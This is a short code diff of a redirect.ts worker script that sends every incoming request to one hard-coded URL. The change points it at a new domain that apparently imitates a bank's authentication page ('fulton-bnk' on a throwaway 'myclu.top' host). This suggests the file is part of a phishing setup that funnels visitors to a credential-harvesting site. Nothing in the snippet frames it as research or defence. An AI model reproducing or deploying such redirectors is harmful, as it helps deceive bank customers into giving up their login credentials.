@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://vriffych.com.es/c/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://www.fulton-bnk.myclu.top/authtempt/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
